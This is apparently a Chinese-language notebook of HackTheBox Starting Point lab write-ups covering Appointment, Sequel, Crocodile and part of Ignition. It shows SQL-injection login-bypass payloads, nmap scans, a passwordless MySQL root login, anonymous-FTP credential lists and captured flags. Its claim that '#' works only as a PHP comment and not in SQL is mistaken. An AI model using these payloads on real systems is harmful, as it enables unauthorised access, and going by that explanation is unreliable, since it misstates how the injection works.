class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#3a6b376c-d53a-47ce-8950-3a4adee207ca">What is a folder called in web-application terminology? → directory</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1d1f97d3-413f-4602-bc47-8b457c4c7ee9">SQL Injection</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7699de3a-337c-4cc0-aa6f-5fcf2c04d73c">get flag</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#9e3c7e6f-e1b5-4706-8278-43313f466d1a">心得</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#612c5bf6-8f1d-46c8-8f52-cd651937ff5e">📚  Sequel (MariaDB weak password)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e360ae67-d4dd-4646-b8f1-b47c75372943">flag</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f88877f9-f933-4889-a5b0-a086f9c74967">🐊  Crocodile (FTP + PHP)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#70279cdd-dada-411f-8898-be9f4abaaefd">Tasks</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d204975b-89b0-4f2a-bae8-783dce8922fc">What FTP code is returned to us for the &quot;Anonymous FTP login allowed&quot; message? → <code>230</code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#5c284ecf-c803-4a85-9276-6d9a182b72e8">What switch can we use with gobuster to specify we are looking for specific filetypes? → <code>-x</code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#29f7a7e8-82ff-45ec-963b-ad5127b65043">flag</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#eb7f361c-774d-4f73-9f2e-c0104f5e568f">🔥  Ignition (PHP + WebFuzzing)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#227dc632-e1da-4770-ba22-8a4787a2819d">Tasks</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f472ee74-9731-4729-ba41-dab770880e8b">What is the full URL to the Magento login page? →</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#89c22ffa-f05d-4fd5-bde6-0b3409d177c0">flag</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c13e2519-c62c-47fd-9c42-3f6c3b601be3">🚴‍♂️  Bike (Server Side Template Injection)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#92566880-a606-4972-8722-7c41a4c12c12">recon</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b6aaaa21-0659-4c40-a418-9b18d458e4f3">template injection</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#93fa1be3-5e30-443e-8b48-691272442899">簡單判斷是哪種 template engine </a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f3742fdb-9437-44d2-8d70-5d779e936639">payload</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e3265414-94e1-476d-abd4-80f60e551892">template engine in sandbox</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#11af5bcc-eafe-48e5-a4e2-d8a56753769f">flag</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ef068357-18bd-41fd-ad06-25754174cf6f">Ref</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#834a29f0-920b-4c8c-99e6-45e1b4d393a3">🤵🏻‍♂️ Pennyworth (Weak Password)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e0cfaa21-6884-4ac5-81e8-3ddfa89261cc">Questions</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#26fbf341-2d42-4d62-8d3e-e97afa28dcd6">What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?: -&gt; <code>confidentiality, integrity, availability</code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cfd0a309-a19e-4c09-b74f-1c6d28b99e09">What type of script is accepted as input on the Jenkins Script Console?: -&gt; Groovy</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#5fe8872b-faed-4bcb-bbc9-8f322ee86c93">What switch should we use with netcat for it to use UDP transport mode?: -&gt; -u</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#30581699-59af-41e8-901d-dfa46583425a">What is the term used to describe making a target host initiate a connection back to the attacker host?: -&gt; <code>reverse shell</code></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4cc85512-c980-4765-88f8-c441e758a7ea">Lab</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0471fce9-d09e-4d3b-8930-df587b3848cb">Script Console</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#adbc811b-d6f2-42d4-ab32-c297077ff936">nc</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a586b1c9-bb15-480c-8043-c9b2ddc73873">nc options to use:</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c10da9ad-5621-4066-913e-589fa052f19b">Reverse Shell Generator</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b2e3e01c-25cd-49c5-a781-448fe68b3a8f">reverse shell payload for Groovy</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2b7e42e9-68c9-4041-a7e9-b282ccf3d09d">Connect from target to our host</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d8cd4bde-9d12-46d5-b3a3-5a187f8a7b87">flag</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d48f6d42-dd70-4a58-8940-c987c37f4764">🏈  Tactics (SMB)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#bcc8830b-4fe7-4da7-aa41-7cf13b7e3f2c">recon</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a5b75b7b-85d2-464b-9cbf-676d43b8fe8d">using smbclient</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6f193bdd-1294-4f9c-8edf-8fb8fd094f24">list</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#76fc796b-6076-4f62-8c4f-1fbf8e8ecff2">connect to shared folder, try to find flag</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#fa87b673-bcd8-4dd8-9d4b-60ca594e719c">flag</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#648c3c88-84fd-4ae5-9521-1a3061d5f32c">Ref</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8c4b66ec-ee91-4305-82f8-b0862d8d8517">tldr nmap</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6dc7c239-935c-45a5-9489-db84353e18a0">tldr smbclient</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#a77f84ca-c332-483f-9aa9-2ecd732549bd">Ref</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#fc7d6311-bb2a-4551-b882-2fe0eee69b77">🔖 bookmarks</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b3c26246-e59b-4bfc-a265-f3d3e16ab12e">others</a></div></nav><hr id="423b7211-8794-477e-a47e-b478a89c26ef"/><h1 id="64b50cc3-a213-4696-ab1c-7f59c19cf554" class="">🗓  Appointment (SQL Injection)</h1><p id="07d37c2d-ae7d-442b-9683-5cd42ec47bce" class="">這題主要是要你利用 SQL injection 的方式跳過驗證直接登入</p><h2 id="0db8d329-df49-46ae-8f6b-4f4574d141a2" class="">Tasks</h2><h3 id="cd8a5eb2-4d39-4ae5-8290-709e2def255c" class="">What does PII stand for? → <code><em>Personally identifiable information</em></code></h3><h3 id="1f5bde1b-51e1-455d-a657-3129bb8f3ada" class="">What does the OWASP Top 10 list name the classification for this vulnerability? → <code>A03:2021-Injection</code></h3><h3 id="ab1cc0cf-b6e6-4ec8-8b07-d0189daca161" class="">What service and version are running on port 80 of the target?</h3><pre id="588ceaf9-8312-4cd0-9663-db73cb481e73" class="code"><code>80/tcp open http Apache httpd 2.4.38 ((Debian))</code></pre><figure id="673eec63-0c0d-4444-914f-2b97f41a795f" class="image"><a href="HTB%20writeu%20673ee/Untitled.png"><img style="width:884px" src="HTB%20writeu%20673ee/Untitled.png"/></a></figure><h3 id="17b5ce5a-00d2-421c-976e-949db08dd976" class="">What is one luck-based method of exploiting login pages? → brute-forcing</h3><h3 id="3a6b376c-d53a-47ce-8950-3a4adee207ca" class="">What is a folder called in web-application terminology? → directory</h3><p id="a6499b3e-c07f-4648-bf18-0dc9dc60a1fd" class="">
+</p><h3 id="1d1f97d3-413f-4602-bc47-8b457c4c7ee9" class="">SQL Injection</h3><p id="482213e3-6cab-4751-b3fa-e731875c850d" class="">直接使用 sql injection</p><figure id="205c1646-497b-49ec-b67b-f503e17c4b4a" class="image"><a href="HTB%20writeu%20673ee/Untitled%201.png"><img style="width:2146px" src="HTB%20writeu%20673ee/Untitled%201.png"/></a></figure><p id="f1b8e355-f001-4bea-8319-398edd1ee077" class="">
+</p><p id="92f2a429-76e1-4485-9001-27f64a09b7f1" class="">滑鼠移上去就提示我們帳號了 @@</p><p id="8c855542-5153-437d-b250-ec46dddedb56" class="">
+</p><p id="d15d8bc2-3f28-4170-9ad4-ffd924820e83" class="">檢查一下 stroage，很空很乾淨</p><figure id="fbf18eda-1678-4978-a9dd-7942f08399ff" class="image"><a href="HTB%20writeu%20673ee/Untitled%202.png"><img style="width:707px" src="HTB%20writeu%20673ee/Untitled%202.png"/></a></figure><h3 id="7699de3a-337c-4cc0-aa6f-5fcf2c04d73c" class="">get flag</h3><p id="1ff36cb0-7c4f-4a01-b906-57001a2d2af2" class="">試試基本的 injection</p><pre id="ab374283-6413-455b-ba1a-5e3203e93b8a" class="code"><code>admin&#x27; OR 1=&#x27;1</code></pre><pre id="37519e11-fa1c-4b78-b84b-1bb213bf9e02" class="code"><code>username=admin%27+OR+1%3D%271&amp;password=123
+password: 123</code></pre><figure id="a7a988a7-8ba9-4955-8f5d-f76fb496b050" class="image"><a href="HTB%20writeu%20673ee/Untitled%203.png"><img style="width:1421px" src="HTB%20writeu%20673ee/Untitled%203.png"/></a></figure><figure id="838f142f-31ed-415c-8e3d-94c1ffd204c0" class="image"><a href="HTB%20writeu%20673ee/Untitled%204.png"><img style="width:898px" src="HTB%20writeu%20673ee/Untitled%204.png"/></a></figure><pre id="1a10cd8a-9dc8-4b54-992c-3b96cc104297" class="code"><code>e3d0796d002a446c0e622226f42e9672</code></pre><h3 id="9e3c7e6f-e1b5-4706-8278-43313f466d1a" class="">心得</h3><p id="26bce8d3-71f2-4e69-b0a5-49208f421a62" class="">官方 writeup 是有先把 nmap, gobuster , 常見帳密組合跑一次, 都無效之後再 sql injection，不過他們使用的是更簡短的語法，先來看看 source code 和測試果</p><pre id="4fc1b09a-958e-458e-a325-95707a4cdc5b" class="code"><code>admin&#x27;#</code></pre><pre id="3069a8e3-f1be-4a70-bd57-a46a23e0a4bd" class="code"><code>$sql=&quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;&quot;;
+# Query for user/pass retrieval from the DB.</code></pre><figure id="39046640-ec54-4222-85fc-089f31a3d795" class="image"><a href="HTB%20writeu%20673ee/Untitled%205.png"><img style="width:1826px" src="HTB%20writeu%20673ee/Untitled%205.png"/></a></figure><figure id="faf3848b-87f1-4001-8995-d16dc3076335" class="image"><a href="HTB%20writeu%20673ee/Untitled%206.png"><img style="width:956px" src="HTB%20writeu%20673ee/Untitled%206.png"/></a></figure><pre id="00db3e9e-2787-4ca5-b28f-1b222f78dedc" class="code"><code>username=admin%27%23&amp;password=123</code></pre><p id="7a4c3687-f23d-4c05-8aa9-745c454ff530" class="">
+</p><p id="cdf4caab-5c09-4076-9cc8-1c5d26813ce9" class="">為什麼用 <code>&#x27;#</code> 也可以成功呢?</p><p id="390f3f82-0770-4486-a8de-4d972367bc14" class="">我們來模擬看看</p><p id="874030c0-bb0a-4d06-9381-4c34a45d4036" class="">
+</p><p id="4a653766-4646-47ce-815e-ef88df6cff79" class="">step1: 這是原本的 code</p><pre id="3b1a2577-190e-44fd-8884-a0cc1a0958ab" class="code"><code>$sql=&quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;&quot;;</code></pre><p id="a024e03a-f091-40c4-a5dc-542f619da750" class="">step2: 如果加入 <code>&#x27;#</code> 會怎樣?  </p><p id="48561eb4-281c-4a60-b015-b185677481fa" class="">&#x27;$username&#x27; → &#x27;$username&#x27;#&#x27;</p><p id="4be0969d-d6d0-48f2-a25e-aa195e4608f6" class="">變數結尾如果被插入 <code>&#x27;#</code> 會讓 &#x27;$username&#x27; 之後的內容被註解掉，也就是 </p><p id="11c250ff-38db-42a6-883d-b1d9a2a6af43" class=""><code>#’ AND password=&#x27;$password&#x27;&quot;;</code> 這段變成註解了</p><pre id="e89292b3-e199-470d-88e1-db8ee04f1154" class="code"><code>$sql=&quot;SELECT * FROM users WHERE username=&#x27;$username&#x27;#&#x27; AND password=&#x27;$password&#x27;&quot;;</code></pre><p id="ed49fdfe-6636-4e7d-bc92-45de865a8fe4" class="">
+</p><p id="360ab5a9-6471-454c-ae82-4f50736cfaf7" class="">但 SQL 的註解只有 <code>--</code> 和 <code>/* */</code> 這兩種，因此這不是 SQL 的註解符號，而是 PHP 的</p><p id="a2937559-2a10-4bd0-87d4-200fbd89746c" class="">注入影響到 PHP 的變數 $sql 的內容，因此等同以下的情形:</p><pre id="7b54cabe-6189-44a4-9830-3ad993566a87" class="code"><code>$sql=&quot;SELECT * FROM users WHERE username=&#x27;admin&#x27;#&#x27; AND password=&#x27;$password&#x27;&quot;;</code></pre><p id="0ef279d8-4ff3-457b-a952-9ea8e036b56f" class="">這邊用 syntax 顏色標示看起來更清楚，這就是字串最後被組成的結果</p><pre id="f1fbf050-e89f-42b5-9997-417fdd232f55" class="code"><code>SELECT * FROM users WHERE username=&#x27;admin&#x27;#&#x27; AND password=&#x27;$password&#x27;</code></pre><hr id="9b7c102f-716d-4ef6-bccb-6e6129caba91"/><h1 id="612c5bf6-8f1d-46c8-8f52-cd651937ff5e" class="">📚  Sequel (MariaDB weak password)</h1><p id="39255534-55d5-4db8-b647-fb8ec10c8b6a" class="">這題只是練習 MySQL 連線而已</p><pre id="e29e4d83-130f-4dea-9c2c-7be48aaab9fb" class="code"><code>10.129.211.185</code></pre><p id="6a8389c1-4ec8-4d25-8fab-3d97c9746be9" class="">
+</p><p id="0608173e-c6f6-4f51-b83e-6ccfbf3983e9" class="">官方 writeup 介紹了其他 nmap 選項</p><pre id="c32f454f-cd42-47fc-a907-499339122157" class="code"><code>-sC: Performs a script scan using the default set of scripts. It is equivalent to --
+script=default. Some of the scripts in this category are considered intrusive and
+should not be run against a target network without permission.
+
+-sV: Enables version detection, which will detect what versions are running on what
+port.</code></pre><p id="f042eb17-b0ee-4ba6-adfa-bd4924485a6f" class="">
+</p><p id="3c6acedc-f396-407d-a3f9-ef534658ca46" class="">
+</p><pre id="c0149bd1-4f2c-4f14-b7cc-4c9ac5f19869" class="code"><code>nmap -sV -p 3306 $target</code></pre><p id="e10d6d91-5441-4971-a220-74b69032086c" class="">如果只有使用 -sV 不足以判斷 mysql version，因此要加上 <code>sV</code></p><figure id="e4d943dd-fcec-410d-bb59-e04a574af602" class="image"><a href="HTB%20writeu%20673ee/Untitled%207.png"><img style="width:880px" src="HTB%20writeu%20673ee/Untitled%207.png"/></a></figure><p id="9a553ac9-3a38-4c85-9c65-9abe9542adbc" class="">
+</p><pre id="c51bd5f0-874d-413c-b0ff-1c9fd805cd61" class="code"><code>nmap -sC -sV $target</code></pre><p id="ed3f89f9-820f-4d35-8fe4-a4839297dc67" class="">就算直接指定 port 3306 也是掃描的很慢 QQ</p><pre id="eb448318-4b2e-42aa-a055-821379de1560" class="code"><code>nmap -v -sV -sC -p 3306 10.129.211.185</code></pre><figure id="487d2d61-f379-4d62-9441-9b8fb5a3c1ca" class="image"><a href="HTB%20writeu%20673ee/Untitled%208.png"><img style="width:3056px" src="HTB%20writeu%20673ee/Untitled%208.png"/></a></figure><pre id="f6323ed4-d2c1-4983-81fb-412d680fea58" class="code"><code>PORT     STATE SERVICE VERSION
+3306/tcp open  mysql?
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+|   Thread ID: 104
+|   Capabilities flags: 63486
+|   Some Capabilities: SupportsCompression, FoundRows, Support41Auth, ConnectWithDatabase, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, Speaks41ProtocolOld, LongColumnFlag, SupportsTransactions, ODBCClient, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: uV.#bGyMT=vY=bUe{]=Z
+|_  Auth Plugin Name: mysql_native_password
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)</code></pre><p id="ca97b81a-bfa5-4f00-994e-bf4671cd0cd8" class="">
+</p><p id="f7ed3cc6-9cdf-4d38-bcfa-4c11614ec5a0" class="">install mysql client</p><p id="7ddb3857-4cf5-4e06-a78b-152122a534a5" class="">在 Parrot OS 沒有內建 mysql client，因此要自行安裝，而且名稱是 <code>default-mysql-client</code></p><pre id="fbf477b5-478d-4955-ad62-601390c4428e" class="code"><code>sudo apt search mysql-client</code></pre><pre id="f56c0426-dcca-4d0a-9bae-4e6b3e6557da" class="code"><code>sudo apt install default-mysql-client</code></pre><p id="4f787c1d-2ecf-4009-b730-f5ddae295287" class="">
+</p><p id="f042f163-65a2-47f9-ac9a-84be131d82b1" class="">接下來就連進資料庫逛逛，沒有設定密碼</p><pre id="c9980c7c-936a-4cfc-bce1-de4bb3912e5b" class="code"><code>mysql -u root -h $target</code></pre><pre id="86ca6be6-b20d-435f-bac1-67e75c5738ba" class="code"><code>mysql -h 10.129.211.185 -u root -p</code></pre><figure id="f66f42ad-231b-42a4-8d20-50b9042be7eb" class="image"><a href="HTB%20writeu%20673ee/Untitled%209.png"><img style="width:1436px" src="HTB%20writeu%20673ee/Untitled%209.png"/></a></figure><pre id="285760ca-5f20-46ea-b788-8c5b9d0930cf" class="code"><code>show databases;
+use htb;
+show tables;
+</code></pre><pre id="48fecd16-5229-43cc-8c56-d9c2127d4e0c" class="code"><code>select * from config;</code></pre><figure id="22cf8f19-5250-4ab9-b4dd-c82a2f3889c6" class="image"><a href="HTB%20writeu%20673ee/Untitled%2010.png"><img style="width:626px" src="HTB%20writeu%20673ee/Untitled%2010.png"/></a></figure><h3 id="e360ae67-d4dd-4646-b8f1-b47c75372943" class="">flag</h3><pre id="d816f5fb-bb59-4cee-a8b1-d9c569a74a39" class="code"><code>7b4bec00d1a39e3dd4e021ec3d915da8</code></pre><p id="3e0339c4-4e8f-4dff-8cdc-d7b3e843b91b" class=""><a href="https://www.hackthebox.com/achievement/machine/929350/403">https://www.hackthebox.com/achievement/machine/929350/403</a></p><hr id="3d48f5c3-e9f1-4e43-ae0e-2a7c42a7bf67"/><h1 id="f88877f9-f933-4889-a5b0-a086f9c74967" class="">🐊  Crocodile (FTP + PHP)</h1><p id="4899a108-6ef3-4245-9f85-6d24b99d7fe0" class="">先找線索及後台路徑，登入後找到 flag</p><h2 id="70279cdd-dada-411f-8898-be9f4abaaefd" class="">Tasks</h2><h3 id="d204975b-89b0-4f2a-bae8-783dce8922fc" class="">What FTP code is returned to us for the &quot;Anonymous FTP login allowed&quot; message? → <code>230</code></h3><h3 id="5c284ecf-c803-4a85-9276-6d9a182b72e8" class="">What switch can we use with gobuster to specify we are looking for specific filetypes? → <code>-x</code></h3><p id="21f96996-8e7a-48c5-b19c-fdc76bfcce23" class="">
+</p><pre id="dade5daa-694e-453c-8d9c-d33551279ad1" class="code"><code>nmap -sV $target</code></pre><figure id="4926e1db-3851-43a1-be56-50b31b573c90" class="image"><a href="HTB%20writeu%20673ee/Untitled%2011.png"><img style="width:1666px" src="HTB%20writeu%20673ee/Untitled%2011.png"/></a></figure><pre id="14a991a0-e011-4541-9bc7-be1de3d13c67" class="code"><code>21/tcp open ftp vsFTPd 3.0.3
+
+80/tcp open  http
+|_http-title: Smash - Bootstrap Business Template</code></pre><p id="221e9640-19f2-4906-95b6-25c81de247eb" class="">
+</p><p id="904d82d9-08e8-41ac-ac15-190ca6b80e9c" class="">
+</p><p id="8231ecfb-b699-4069-a986-91723e28813b" class="">ftp 可匿名登入，nmap 也幫我們列出檔案了</p><figure id="a116e431-4d9e-4fb2-90d4-d89ccabbd0c6" class="image"><a href="HTB%20writeu%20673ee/Untitled%2012.png"><img style="width:2724px" src="HTB%20writeu%20673ee/Untitled%2012.png"/></a></figure><p id="bb9db5a1-dd55-4b20-9996-a896e4814bf0" class="">
+</p><p id="3400e919-428e-43dc-8d5b-c20e59b1a055" class="">如果要看詳細的 log，記得點 <code>Show detailed log</code></p><figure id="636cbf53-f083-4e39-a0c9-a353e57b93a2" class="image"><a href="HTB%20writeu%20673ee/Untitled%2013.png"><img style="width:1518px" src="HTB%20writeu%20673ee/Untitled%2013.png"/></a></figure><pre id="8327712d-9428-43b0-9df3-e71c2e1b7ec5" class="code"><code>Status:	Connecting to 10.129.1.15:21...
+Status:	Connection established, waiting for welcome message...
+Response:	220 (vsFTPd 3.0.3)
+Command:	AUTH TLS
+Response:	530 Please login with USER and PASS.
+Command:	AUTH SSL
+Response:	530 Please login with USER and PASS.
+Status:	Insecure server, it does not support FTP over TLS.
+Command:	USER anonymous
+Response:	230 Login successful.
+Status:	Server does not support non-ASCII characters.
+Status:	Logged in
+Status:	Retrieving directory listing...
+Command:	PWD
+Response:	257 &quot;/&quot; is the current directory
+Status:	Directory listing of &quot;/&quot; successful</code></pre><figure id="32b74719-7789-4346-bf6c-61fda219161d" class="image"><a href="HTB%20writeu%20673ee/Untitled%2014.png"><img style="width:806px" src="HTB%20writeu%20673ee/Untitled%2014.png"/></a></figure><pre id="2060f69f-728d-457e-a1cc-66c869ba1583" class="code"><code>aron
+pwnmeow
+egotisticalsw
+admin</code></pre><pre id="b01748db-0807-4a68-a8e9-4a8782b6724e" class="code"><code>root
+Supersecretpassword1
+@BaASD&amp;9032123sADS
+rKXM59ESxesUFHAd</code></pre><p id="5662476a-b21b-416b-a241-dfaf3c76a757" class="">從這邊應該可以看出，題目要我們手動或自動 try 帳密</p><p id="81dba813-5890-4951-b449-72dc6b00ea29" class="">
+</p><p id="dcf7b752-64cb-4de5-a111-ef4c0224b99a" class="">靶機的網站應該就是接下來要去的地方，只是這邊沒有登入的頁面，那應該就是要找找看後台的路徑</p><figure id="e5fb0d27-8207-4ade-9444-db49432017f4" class="image"><a href="HTB%20writeu%20673ee/Untitled%2015.png"><img style="width:2224px" src="HTB%20writeu%20673ee/Untitled%2015.png"/></a></figure><p id="3710e4b1-e7a4-44c5-9ba2-284a1339cc81" class="">
+</p><p id="55b28653-282f-4bca-a890-e6ddf90b6d86" class="">先手動嘗試 碰碰運氣 (官方 writeup 是使用 gobuster 去找後台登入頁面)</p><pre id="218fd6be-4618-42cc-99ba-92e3ce56d3c3" class="code"><code>admin
+admin_panel
+manage
+login
+dashboard
+...</code></pre><p id="799c0460-7f75-43a9-98a0-326273886e6b" class="">
+</p><p id="887f38d3-aaee-4654-a1a3-fbb0eed988fe" class="">
+</p><figure id="989efeb7-60f6-4e10-b4fc-f71026c9894c" class="image"><a href="HTB%20writeu%20673ee/Untitled%2016.png"><img style="width:624px" src="HTB%20writeu%20673ee/Untitled%2016.png"/></a></figure><p id="2ee75035-7940-4fc7-82f4-02b74ea71403" class="">隨然 nmap 沒掃到 http server 版本，但通常錯誤頁面會有版本號</p><pre id="64746012-d489-4255-af15-23c0d4272ee9" class="code"><code>Apache/2.4.41</code></pre><p id="d5a67996-bc96-4e03-a87a-145943d4c692" class="">也可以用 wappalyer 查看</p><figure id="263068cc-19d9-4730-924a-378c1895b2f0" class="image"><a href="HTB%20writeu%20673ee/Untitled%2017.png"><img style="width:432px" src="HTB%20writeu%20673ee/Untitled%2017.png"/></a></figure><p id="63250733-e273-4425-ae9a-4ae2f236c542" class="">
+</p><p id="eed30686-661c-416f-8de7-0e7f52e42ae2" class="">try 到 dashboard 時就跳轉到 <code>login.php</code> 了，接下來就是用剛剛在 ftp 拿到的帳密試試看</p><figure id="576f06e2-4d44-4597-ad3f-382620228b65" class="image"><a href="HTB%20writeu%20673ee/Untitled%2018.png"><img style="width:1516px" src="HTB%20writeu%20673ee/Untitled%2018.png"/></a></figure><p id="4f15c3a8-cd7b-49df-adfb-115264bf66a0" class="">
+</p><p id="174b5086-320a-4c07-92ae-b36c2d5f10f0" class="">先手動 try 各組帳密，從第一組開始測發現確實沒辦法一試就中，接著從最後一組試才中，如果帳密組合有限且正常對應就可以慢慢 try，如果帳密組合是隨機對應，那只好用工具了</p><pre id="834dbe21-3ea6-4cec-a4fd-856327bb807f" class="code"><code>admin:rKXM59ESxesUFHAd</code></pre><h3 id="29f7a7e8-82ff-45ec-963b-ad5127b65043" class="">flag</h3><figure id="f2c0b7b4-bf46-42ee-a209-b13dedd432fe" class="image"><a href="HTB%20writeu%20673ee/Untitled%2019.png"><img style="width:2846px" src="HTB%20writeu%20673ee/Untitled%2019.png"/></a></figure><pre id="b98c06a0-9470-416f-92d4-e64a7d23ec65" class="code"><code>c7110277ac44d78b6a9fff2232434d16</code></pre><p id="eb07c3d1-7e05-4aac-8a55-8b0f94947da1" class=""><a href="https://www.hackthebox.com/achievement/machine/929350/404">https://www.hackthebox.com/achievement/machine/929350/404</a></p><hr id="28a78e01-3278-4290-889d-90bd27ca5a1e"/><h1 id="eb7f361c-774d-4f73-9f2e-c0104f5e568f" class="">🔥  Ignition (PHP + WebFuzzing)</h1><p id="ca5f6101-4c2b-4318-9777-a27346c531ad" class="">
+</p><pre id="bc7857cd-98c1-49ea-862c-7e225b7506e2" class="code"><code>10.129.128.51</code></pre><p id="e71c5741-d464-49ea-b2ba-44f439384983" class="">
+</p><h2 id="227dc632-e1da-4770-ba22-8a4787a2819d" class="">Tasks</h2><h3 id="f472ee74-9731-4729-ba41-dab770880e8b" class="">What is the full URL to the Magento login page? →</h3><p id="0444dfd1-a483-40aa-9a25-1517d0765657" class="">
+</p><figure id="5dceaace-0ac0-40c4-859f-5c670bfea413" class="image"><a href="HTB%20writeu%20673ee/Untitled%2020.png"><img style="width:1276px" src="HTB%20writeu%20673ee/Untitled%2020.png"/></a></figure><pre id="fdda116e-41e0-43c0-b4f9-44703f64ec7f" class="code"><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.2
+|_http-title: Did not follow redirect to http://ignition.htb/
+|_http-server-header: nginx/1.14.2</code></pre><p id="f791e1e0-357a-457d-b784-91a77a95f15f" class="">可以看出連到靶機的話可能會被重導 (302)</p><p id="e8ea9269-4f5b-4bea-bc4e-83adb12d41fd" class="">
+</p><p id="c9e0de2c-0ce1-40ab-89cf-9772da92779d" class="">直接用瀏覽器連靶機 ip 的話會發現</p><figure id="be44d557-1d55-4a5d-a7cc-878e5f0b91b1" class="image"><a href="HTB%20writeu%20673ee/Untitled%2021.png"><img style="width:432px" src="HTB%20writeu%20673ee/Untitled%2021.png"/></a></figure><p id="c7f6bd77-dadf-4c7f-95cd-ec0f6441ae1b" class="">連 state code 都沒有</p><figure id="73450fd3-29bb-4f7e-ab68-e26391364cc8" class="image"><a href="HTB%20writeu%20673ee/Untitled%2022.png"><img style="width:1408px" src="HTB%20writeu%20673ee/Untitled%2022.png"/></a></figure><p id="4c35087d-7710-4341-9718-d759787ce1dc" class="">
+</p><p id="fcf4383f-4dfa-442e-8479-2b589e39da8c" class="">換成 https 也是一樣</p><figure id="3f2d1b5f-3588-4684-aa86-ca5fe5103fa7" class="image"><a href="HTB%20writeu%20673ee/Untitled%2023.png"><img style="width:432px" src="HTB%20writeu%20673ee/Untitled%2023.png"/></a></figure><figure id="d828a3d1-1cb9-4179-9e4d-c0345104a8f6" class="image"><a href="HTB%20writeu%20673ee/Untitled%2024.png"><img style="width:1276px" src="HTB%20writeu%20673ee/Untitled%2024.png"/></a></figure><p id="8a6af5f8-e48c-4a1d-ad4b-791a12a90162" class="">
